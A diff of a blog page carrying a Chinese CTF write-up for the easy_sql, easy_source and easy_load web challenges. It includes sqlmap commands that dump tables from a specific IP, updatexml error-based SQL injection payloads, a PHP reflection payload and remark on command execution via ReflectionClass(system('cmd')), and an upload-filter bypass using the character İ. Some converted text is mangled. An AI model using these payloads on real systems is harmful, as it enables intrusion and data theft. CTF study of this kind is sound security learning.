@@ -243,54 +243,44 @@
               </p>
             
             <div class="markdown-body">
-              <h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p><strong>考点：无列名和报错注入</strong></p>
-<ol>
+              <h2 id="easy_sql">easy_sql</h2>
+<p><strong>考点：无列名和报错注入</strong></p>
+<ol type="1">
 <li>爆表名：</li>
 </ol>
 <pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  -D security -common-tables</code></pre>
-
 <p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143910.png" srcset="/img/loading.gif" alt="image-20210515132807394"></p>
 <p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143912.png" srcset="/img/loading.gif" alt="image-20210515132817070"></p>
-<ol start="2">
-<li>爆列名，发现只有自增id列，说明还有列名没有显示，==这时候就应该想到无列名注入了==<pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  -D security -T flag --columns --<span class="hljs-keyword">hex</span></code></pre>
-
-</li>
+<ol start="2" type="1">
+<li>爆列名，发现只有自增id列，说明还有列名没有显示，==这时候就应该想到无列名注入了==
+<pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  -D security -T flag --columns --<span class="hljs-keyword">hex</span></code></pre></li>
 </ol>
 <p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143913.png" srcset="/img/loading.gif" alt="image-20210515135616512"></p>
 <pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  -D security -T flag -C <span class="hljs-string">&quot;id&quot;</span> --<span class="hljs-keyword">dump</span> --<span class="hljs-keyword">hex</span></code></pre>
-
 <p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143914.png" srcset="/img/loading.gif" alt="image-20210515135759698"></p>
-<ol start="3">
+<ol start="3" type="1">
 <li>另一个表啥也没有</li>
 </ol>
 <pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  -D security -T users --columns --<span class="hljs-keyword">hex</span></code></pre>
-
 <p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143915.png" srcset="/img/loading.gif" alt="image-20210515140045222"></p>
 <pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  -D security -T users -C <span class="hljs-string">&quot;id,username&quot;</span> --<span class="hljs-keyword">dump</span> --<span class="hljs-keyword">hex</span></code></pre>
-
 <p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143916.png" srcset="/img/loading.gif" alt="image-20210515140322605"></p>
-<ol start="4">
+<ol start="4" type="1">
 <li>用户信息也不是管理员</li>
 </ol>
 <pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  --is-dba</code></pre>
-
 <p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143917.png" srcset="/img/loading.gif" alt="image-20210515142804930"></p>
 <p>5.无列名报错注入</p>
 <pre><code class="hljs sql">1&#x27;) and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> flag <span class="hljs-keyword">as</span> b <span class="hljs-keyword">using</span>(<span class="hljs-keyword">id</span>,<span class="hljs-keyword">no</span>))<span class="hljs-keyword">as</span> c),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#&amp;Submit=%E7%99%BB%E5%BD%95</span></code></pre>
-
 <p>报错出字段，继续</p>
 <pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=admin&amp;passwd=<span class="hljs-number">1</span>&#x27;)||updatexml(<span class="hljs-number">1</span>,((select `cb<span class="hljs-number">9704</span>e<span class="hljs-number">8</span>-dfcb-<span class="hljs-number">4</span>feb-<span class="hljs-number">90</span>c<span class="hljs-number">7</span>-d<span class="hljs-number">84</span>c<span class="hljs-number">92</span>ef<span class="hljs-number">0062</span>` from flag limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span>#&amp;Submit=%E<span class="hljs-number">7</span>%<span class="hljs-number">99</span>%BB%E<span class="hljs-number">5</span>%BD%<span class="hljs-number">95</span></code></pre>
-
-
-
-
-
-
-
-<h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p><a target="_blank" rel="noopener" href="https://r0yanx.com/2020/10/28/fslh-writeup/">原题</a></p>
-<ol>
-<li>这题考察了php原生类的使用，参考ctfshow的web100使用反射类new ReflectionClass(“类名”)，获得这个类的信息</li>
-<li>原题，ReflectionMethod 构造 User 类中的函数方法，再通过 getDocComment 获取函数的注释</li>
+<h2 id="easy_source">easy_source</h2>
+<p><a target="_blank" rel="noopener" href="https://r0yanx.com/2020/10/28/fslh-writeup/">原题</a></p>
+<ol type="1">
+<li>这题考察了php原生类的使用，参考ctfshow的web100使用反射类new
+ReflectionClass("类名")，获得这个类的信息</li>
+<li>原题，ReflectionMethod 构造 User 类中的函数方法，再通过
+getDocComment 获取函数的注释</li>
 <li>考虑利用原生类ReflectionMethod读取用户类中的方法</li>
 </ol>
 <p><strong>dirsearch使用</strong></p>
@@ -302,30 +292,29 @@
 <span class="hljs-deletion">-r 递归扫描     非常耗时</span>
 //在扫描时要退出扫描，请从键盘解析“e”。要从停止点继续执行，请解析“c&quot;。解析“ n”以移至下一个目录。这些步骤将使您可以控制结果，因为递归扫描是一个耗时的过程。
 <span class="hljs-deletion">-R 递归深度级别</span></code></pre>
-
-<h3 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h3><p><a target="_blank" rel="noopener" href="https://ninjia.gitbook.io/secskill/web/info">**参考，secskill</a>，<a target="_blank" rel="noopener" href="https://www.yuque.com/lakemoon/dctose/tpg530">语雀+漏洞案例</a>、<a target="_blank" rel="noopener" href="https://www.imbajin.com/web%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E4%B9%8B%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B(%E4%B8%80)/">个人博客初级+python批量扫描</a></p>
-<pre><code>1.    常见检测方法是通过对网站进行web漏洞扫描，直接利用爬虫来爬取网站可能存在的路径以及链接，如果存在备份文件，则可通过web直接进行下载。
-2.    也可以通过自行构造字典，对网站某一目录下，指定字典进行爆破，常见的扫描工具有wwwscan、御剑后台扫描工具等。
+<h3 id="敏感文件">敏感文件</h3>
+<p><a target="_blank" rel="noopener" href="https://ninjia.gitbook.io/secskill/web/info">**参考，secskill</a>，<a target="_blank" rel="noopener" href="https://www.yuque.com/lakemoon/dctose/tpg530">语雀+漏洞案例</a>、<a target="_blank" rel="noopener" href="https://www.imbajin.com/web%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E4%B9%8B%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B(%E4%B8%80)/">个人博客初级+python批量扫描</a></p>
+<pre><code>1.  常见检测方法是通过对网站进行web漏洞扫描，直接利用爬虫来爬取网站可能存在的路径以及链接，如果存在备份文件，则可通过web直接进行下载。
+2.  也可以通过自行构造字典，对网站某一目录下，指定字典进行爆破，常见的扫描工具有wwwscan、御剑后台扫描工具等。
 3. 在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</code></pre>
-<p>以 index.php 为例：第一次产生的交换文件名为 .index.php.swp<br>再次意外退出后，将会产生名为 .index.php.swo 的交换文件<br>第三次产生的交换文件则为 .index.php.swn</p>
-<pre><code class="hljs css">常见的备份文件格式有：
+<p>以 index.php 为例：第一次产生的交换文件名为 .index.php.swp
+再次意外退出后，将会产生名为 .index.php.swo 的交换文件
+第三次产生的交换文件则为 .index.php.swn <pre><code class="hljs css">常见的备份文件格式有：
 <span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.phps</span>
 <span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.swp</span>
 <span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.swo</span>
 <span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.php</span>~
 <span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.bak</span>
 <span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.txt</span>
-<span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.old</span></code></pre>
-
-
-
-
-
-
-
-<h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><p><a target="_blank" rel="noopener" href="https://www.kancloud.cn/shaoguan/phpstudy/384102">笔记</a><br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844904148891074568">****掘金，各类函数，属性用法</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d02cbde1cdd7">简书</a></p>
+<span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.old</span></code></pre></p>
+<h3 id="反射">反射</h3>
+<p><a target="_blank" rel="noopener" href="https://www.kancloud.cn/shaoguan/phpstudy/384102">笔记</a>
+<a target="_blank" rel="noopener" href="https://juejin.cn/post/6844904148891074568">****掘金，各类函数，属性用法</a>
+<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d02cbde1cdd7">简书</a></p>
 <blockquote>
-<p>面向对象编程中对象被赋予了自省的能力，而这个自省的过程就是反射。<br>反射，直观理解就是根据到达地找到出发地和来源。比如，<strong>一个光秃秃的对象，我们可以仅仅通过这个对象就能知道它所属的类、拥有哪些方法</strong>。<br>反射是指在PHP运行状态中，扩展分析PHP程序，导出或提出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取信息以及动态调用对象方法的功能称为反射API。</p>
+<p>面向对象编程中对象被赋予了自省的能力，而这个自省的过程就是反射。
+反射，直观理解就是根据到达地找到出发地和来源。比如，<strong>一个光秃秃的对象，我们可以仅仅通过这个对象就能知道它所属的类、拥有哪些方法</strong>。
+反射是指在PHP运行状态中，扩展分析PHP程序，导出或提出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取信息以及动态调用对象方法的功能称为反射API。</p>
 </blockquote>
 <pre><code class="hljs php"><span class="hljs-comment">// 获取对象属性列表</span>
 $reflect = <span class="hljs-keyword">new</span> ReflectionObject($student);
@@ -338,52 +327,46 @@ $m=$reflect-&gt;getMethods();
 <span class="hljs-keyword">foreach</span> ($m <span class="hljs-keyword">as</span> $prop) &#123;
   <span class="hljs-keyword">print</span> $prop-&gt;getName() .<span class="hljs-string">&quot;\n&quot;</span>;
 &#125;</code></pre>
-
-<p>反射注释</p>
-<pre><code class="hljs awk"><span class="hljs-variable">$classComment</span> = <span class="hljs-variable">$refClass</span>-&gt;getDocComment();  <span class="hljs-regexp">//</span> 获取User类的注释文档，即定义在类之前的注释
+<p>反射注释 <pre><code class="hljs awk"><span class="hljs-variable">$classComment</span> = <span class="hljs-variable">$refClass</span>-&gt;getDocComment();  <span class="hljs-regexp">//</span> 获取User类的注释文档，即定义在类之前的注释
 <span class="hljs-variable">$methodComment</span> = <span class="hljs-variable">$refClass</span>-&gt;getMethod(<span class="hljs-string">&#x27;setPassowrd&#x27;</span>)-&gt;getDocComment();  <span class="hljs-regexp">//</span> 获取User类中setPassowrd方法的注释
 <span class="hljs-regexp">//</span><span class="hljs-variable">$classComment</span> 结果如下：
 <span class="hljs-regexp">/** * 用户相关类 */</span>
 <span class="hljs-regexp">//</span><span class="hljs-variable">$methodComment</span> 结果如下：
-<span class="hljs-regexp">/** * 设置密码 * @param string $password */</span></code></pre>
-
-
-
-
-
-<h3 id="ctf-中的php反射"><a href="#ctf-中的php反射" class="headerlink" title="ctf 中的php反射"></a>ctf 中的php反射</h3><p><a target="_blank" rel="noopener" href="https://www.codeleading.com/article/24664981902/">参考+讲解ctfshow100</a></p>
-<p>反射类不仅仅可以建立对类的映射，<strong>也可以建立对PHP基本方法的映射，并且返回基本方法执行的情况【ReflectionClass类并传入PHP代码时，会返回代码的运行结果】</strong>。因此可以通过建立反射类new ReflectionClass(system(‘cmd’))来执行命令</p>
-<p>要点：通过建立反射类<code>new ReflectionClass(system(&#39;cmd&#39;))</code>来执行命令</p>
-<h3 id="本题"><a href="#本题" class="headerlink" title="本题"></a>本题</h3><ul>
-<li><p>设法反射注释</p>
-</li>
-<li><p>平常我们用的比较多的是 ReflectionClass类 和 ReflectionMethod类</p>
-</li>
-<li><p>ReflectionClass类只能传入一个参数【参数是类名】，所以我们尝试ReflectionMethod类【参数是类名+方法】</p>
-</li>
-<li><p><code>$method = new ReflectionMethod(&#39;Counter&#39;, &#39;increment&#39;);</code></p>
-</li>
-<li><p>本题考察的是 PHP反射，ReflectionMethod 构造 User 类中的函数方法，再通过 getDocComment 获取函数的注释，本例中使用__toString 同样可以输出函数注释内容。</p>
-</li>
-<li><p>payload:</p>
-<pre><code class="hljs dts">?rc=ReflectionMethod<span class="hljs-variable">&amp;ra</span>=User<span class="hljs-variable">&amp;rb</span>=a<span class="hljs-variable">&amp;rd</span>=getDocComment</code></pre>
-<p>因为不知道是在哪个函数的注释中，所以逐个函数【rb】暴破，暴破 rb 的值 a-z，可以发现 flag 在 q的注释中，回显flag</p>
-</li>
+<span class="hljs-regexp">/** * 设置密码 * @param string $password */</span></code></pre></p>
+<h3 id="ctf-中的php反射">ctf 中的php反射</h3>
+<p><a target="_blank" rel="noopener" href="https://www.codeleading.com/article/24664981902/">参考+讲解ctfshow100</a></p>
+<p>反射类不仅仅可以建立对类的映射，<strong>也可以建立对PHP基本方法的映射，并且返回基本方法执行的情况【ReflectionClass类并传入PHP代码时，会返回代码的运行结果】</strong>。因此可以通过建立反射类new
+ReflectionClass(system(‘cmd’))来执行命令</p>
+<p>要点：通过建立反射类<code>new ReflectionClass(system('cmd'))</code>来执行命令</p>
+<h3 id="本题">本题</h3>
+<ul>
+<li><p>设法反射注释</p></li>
+<li><p>平常我们用的比较多的是 ReflectionClass类 和
+ReflectionMethod类</p></li>
+<li><p>ReflectionClass类只能传入一个参数【参数是类名】，所以我们尝试ReflectionMethod类【参数是类名+方法】</p></li>
+<li><p><code>$method = new ReflectionMethod('Counter', 'increment');</code></p></li>
+<li><p>本题考察的是 PHP反射，ReflectionMethod 构造 User
+类中的函数方法，再通过 getDocComment
+获取函数的注释，本例中使用__toString 同样可以输出函数注释内容。</p></li>
+<li><p>payload: <pre><code class="hljs dts">?rc=ReflectionMethod<span class="hljs-variable">&amp;ra</span>=User<span class="hljs-variable">&amp;rb</span>=a<span class="hljs-variable">&amp;rd</span>=getDocComment</code></pre>
+因为不知道是在哪个函数的注释中，所以逐个函数【rb】暴破，暴破 rb 的值
+a-z，可以发现 flag 在 q的注释中，回显flag</p></li>
 </ul>
-<h4 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wong_gilbert/article/details/76679108?utm_source=app&app_version=4.7.1">__tostring</a>：对象被当成字符串输出时会自动触发的函数，必须得有return</p>
+<h4 id="更多">更多</h4>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wong_gilbert/article/details/76679108?utm_source=app&amp;app_version=4.7.1">__tostring</a>：对象被当成字符串输出时会自动触发的函数，必须得有return</p>
 <p><a target="_blank" rel="noopener" href="https://museljh.github.io/2019/04/24/ctf%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84/">2019ciscn反射</a></p>
-<h2 id="easy-load"><a href="#easy-load" class="headerlink" title="easy_load"></a>easy_load</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/116885083?utm_source=app&app_version=4.7.1">**yu师傅</a><br>【<a target="_blank" rel="noopener" href="https://midiya.blog.csdn.net/article/details/117044715">2</a>】</p>
-<p>考点：</p>
-<ol>
-<li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000000591094">php中$_FILES变量的用法及文件上传过程</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-file-upload.html">菜鸟教程文件上传与$_FILES用法</a></li>
-<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Learn/Forms/Sending_and_retrieving_form_data">MDN WEB DOCS发送表单数据</a></li>
-</ol>
-<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><ol>
+<h2 id="easy_load">easy_load</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/116885083?utm_source=app&amp;app_version=4.7.1">**yu师傅</a>
+【<a target="_blank" rel="noopener" href="https://midiya.blog.csdn.net/article/details/117044715">2</a>】</p>
+<p>考点： 1. <a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-file-upload.html">php中<span class="math inline">\(_FILES变量的用法及文件上传过程](https://segmentfault.com/a/1190000000591094)
+2. [菜鸟教程文件上传与\)</span>_FILES用法</a> 3. <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Learn/Forms/Sending_and_retrieving_form_data">MDN
+WEB DOCS发送表单数据</a></p>
+<h4 id="文件上传">文件上传</h4>
+<ol type="1">
 <li>在使用表单的时候经常将表单的数据发送至php脚本做处理，然后，我们可以用表单提交的过程来<strong>实现运行php脚本</strong></li>
 <li>这样点击提交按钮时就可以实现运行php脚本，action里的php文件代表你要执行的脚本</li>
 <li>action表示表单数据接收方，实现对数据的各种处理</li>
-<li><code>$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]</code>是该临时文件的路径（而非名称）</li>
+<li><code>$_FILES['file']['tmp_name']</code>是该临时文件的路径（而非名称）</li>
 </ol>
 <p>index.php</p>
 <pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
@@ -417,30 +400,33 @@ $m=$reflect-&gt;getMethods();
         <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;传都没有传上去&quot;</span>);
     &#125;
 &#125;</code></pre>
-<ol>
-<li>getimagesize—返回图像信息【数组】,参数是路径/url，必须是图像，否则返回false<ul>
-<li>返回数组信息：<blockquote>
+<ol type="1">
+<li>getimagesize—返回图像信息【数组】,参数是路径/url，必须是图像，否则返回false</li>
+</ol>
 <ul>
-<li> 索引 0 给出的是图像宽度的像素值</li>
-<li> 索引 1 给出的是图像高度的像素值</li>
-<li> 索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</li>
-<li> 索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签</image></li>
-<li> 索引 bits 给出的是图像的每种颜色的位数，二进制格式</li>
-<li> 索引 channels 给出的是图像的通道值，RGB 图像默认是 3</li>
-<li> 索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(“Content-type: image/jpeg”);</li>
-<li>⚠️此时mime检测的不是数据包中的content-type，而是图片的文件头</li>
+<li>返回数组信息： &gt; - 索引 0 给出的是图像宽度的像素值 &gt; - 索引 1
+给出的是图像高度的像素值 &gt; - 索引 2
+给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 =
+SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola
+byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 =
+IFF，15 = WBMP，16 = XBM &gt; - 索引 3
+给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签 &gt; -
+索引 bits 给出的是图像的每种颜色的位数，二进制格式 &gt; - 索引 channels
+给出的是图像的通道值，RGB 图像默认是 3 &gt; - 索引 mime 给出的是图像的
+MIME 信息，此信息可以用来在 HTTP Content-type
+头信息中发送正确的信息，如： header("Content-type: image/jpeg"); &gt; -
+⚠️此时mime检测的不是数据包中的content-type，而是图片的文件头</image></li>
 </ul>
-</blockquote>
-</li>
-</ul>
-</li>
-<li>stristr() 函数搜索字符串在另一字符串中的第一次出现并返回其及余下部分</li>
+<ol start="2" type="1">
+<li>stristr()
+函数搜索字符串在另一字符串中的第一次出现并返回其及余下部分</li>
 <li>mb_strtolower—返回小写的字符串，比strtolower支持更多字符，如unicode</li>
 <li>move_uploaded_file—将上传的文件A移动的新位置B，成功返回true，失败返回false</li>
 </ol>
-<h4 id="解读："><a href="#解读：" class="headerlink" title="解读："></a>解读：</h4><p>index.php内容：<br>参数ctf要==’upload’，大小要小于1024*512，文件得为图片，图片长宽需相等，文件名不能有c、i、h、ph，最后将文件名转小写上传到/var/www/html/image/下</p>
-<p>example.php</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<h4 id="解读">解读：</h4>
+<p>index.php内容：
+参数ctf要==’upload’，大小要小于1024*512，文件得为图片，图片长宽需相等，文件名不能有c、i、h、ph，最后将文件名转小写上传到/var/www/html/image/下</p>
+<p>example.php <pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>])) &#123;
     highlight_file(<span class="hljs-keyword">__FILE__</span>);
     <span class="hljs-keyword">die</span>();
@@ -481,56 +467,51 @@ $m=$reflect-&gt;getMethods();
         unlink($file);
     &#125;
 
-&#125;</code></pre>
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1722696">php利用ZipArchive类操作文件的实例</a></p>
+&#125;</code></pre> <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1722696">php利用ZipArchive类操作文件的实例</a>
+- 类前加反斜杠意思是全局搜索类 &gt;
+ZipArchive类—对文件进行压缩与解压缩处理 &gt; &gt;
+ZipArchive::extractTo,将压缩包解压到指定目录【解压】 &gt; &gt;
+ZipArchive::open,打开一个zip压缩包【必备】【成功返回true】 &gt; &gt;
+ZipArchive::addFile,将文件添加到指定zip压缩包中【压缩】 &gt; &gt;
+ZipArchive::addFromString,将指定内容的文件添加到压缩包</p>
 <ul>
-<li><p>类前加反斜杠意思是全局搜索类</p>
-<blockquote>
-<p>ZipArchive类—对文件进行压缩与解压缩处理</p>
-<p>ZipArchive::extractTo,将压缩包解压到指定目录【解压】</p>
-<p>ZipArchive::open,打开一个zip压缩包【必备】【成功返回true】</p>
-<p>ZipArchive::addFile,将文件添加到指定zip压缩包中【压缩】</p>
-<p>ZipArchive::addFromString,将指定内容的文件添加到压缩包</p>
-</blockquote>
-</li>
-<li><p>$_SERVER[‘REMOTE_ADDR’]; //访问端（有可能是用户，有可能是代理的）IP【<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jackluo/archive/2013/03/03/2941411.html">与其他获取ip的区别</a>】 </p>
-</li>
-<li><p>unlink—删除文件，成功返回true【<code>/.</code>可以绕过unlink】</p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_filesystem_glob.asp">glob</a> — 寻找与模式匹配的文件名/目录的数组</p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6600341d8754">简书，图像相关函数</a></p>
-</li>
-<li><p>imagecreatefrompng—由文件或url创建一个图像</p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://vimsky.com/examples/usage/php-imagecrop-function.html">imagecrop</a>—图像裁剪函数，将图像裁剪到给定的矩形区域，然后返回生成的图像。成功时返回裁剪的图像资源，或者在失败时返回FALSE。</p>
-</li>
-<li><p>imagejpeg—以 JPEG格式将图像输出到浏览器或文件</p>
-</li>
-<li><p>pathinfo() 函数以数组的形式返回文件路径/文件格式的信息，第二个参数指定哪个数组元素</p>
+<li>$_SERVER['REMOTE_ADDR'];
+//访问端（有可能是用户，有可能是代理的）IP【<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jackluo/archive/2013/03/03/2941411.html">与其他获取ip的区别</a>】</li>
+<li>unlink—删除文件，成功返回true【<code>/.</code>可以绕过unlink】</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_filesystem_glob.asp">glob</a>
+— 寻找与模式匹配的文件名/目录的数组</li>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6600341d8754">简书，图像相关函数</a></li>
+<li>imagecreatefrompng—由文件或url创建一个图像</li>
+<li><a target="_blank" rel="noopener" href="https://vimsky.com/examples/usage/php-imagecrop-function.html">imagecrop</a>—图像裁剪函数，将图像裁剪到给定的矩形区域，然后返回生成的图像。成功时返回裁剪的图像资源，或者在失败时返回FALSE。</li>
+<li>imagejpeg—以 JPEG格式将图像输出到浏览器或文件</li>
+<li>pathinfo()
+函数以数组的形式返回文件路径/文件格式的信息，第二个参数指定哪个数组元素
 <pre><code class="hljs php"><span class="hljs-keyword">Array</span>
 (
 [dirname] =&gt; /testweb
 [basename] =&gt; test.txt
 [extension] =&gt; txt
-)</code></pre>
-<h4 id="解读：-1"><a href="#解读：-1" class="headerlink" title="解读："></a>解读：</h4></li>
+)</code></pre> #### 解读：</li>
 </ul>
-<p>example内容：<br>ctf参数要==’poc’，file文件最后后缀得为===zip【但是index.php里把i过滤了！】，并将其解压到<code>/tmp/example/用户ip</code> 目录下，并删除原压缩文件，对解压后的每一个文件，生成png并裁剪然后生成到example/下</p>
-<h4 id><a href="#" class="headerlink" title></a></h4><h4 id="1-绕mb-strwolower"><a href="#1-绕mb-strwolower" class="headerlink" title="1. 绕mb_strwolower"></a>1. 绕mb_strwolower</h4><p>其中，在3.6、7.1等版本中，mb_strtolower(‘İ’)===’i’，mb_strtolower的小写映射时将’İ’映射到i，目前只发现该函数和如下字符存在漏洞：<strong>使用İ字符可以绕过i字符的匹配，如果php这三个字符也能绕过就能直接上传php了</strong></p>
-<p><strong>结合example.php的解压压缩包 我们利用zİp来替代zip（İ会被解析/认为为I，再通过mb_strtolower就变成了i）</strong></p>
+<p>example内容：
+ctf参数要==’poc’，file文件最后后缀得为===zip【但是index.php里把i过滤了！】，并将其解压到<code>/tmp/example/用户ip</code>
+目录下，并删除原压缩文件，对解压后的每一个文件，生成png并裁剪然后生成到example/下</p>
+<h4 id="section"></h4>
+<h4 id="绕mb_strwolower">1. 绕mb_strwolower</h4>
+<p>其中，在3.6、7.1等版本中，mb_strtolower('İ')==='i'，mb_strtolower的小写映射时将'İ'映射到i，目前只发现该函数和如下字符存在漏洞：<strong>使用İ字符可以绕过i字符的匹配，如果php这三个字符也能绕过就能直接上传php了</strong></p>
+<p><strong>结合example.php的解压压缩包
+我们利用zİp来替代zip（İ会被解析/认为为I，再通过mb_strtolower就变成了i）</strong></p>
 <pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>);
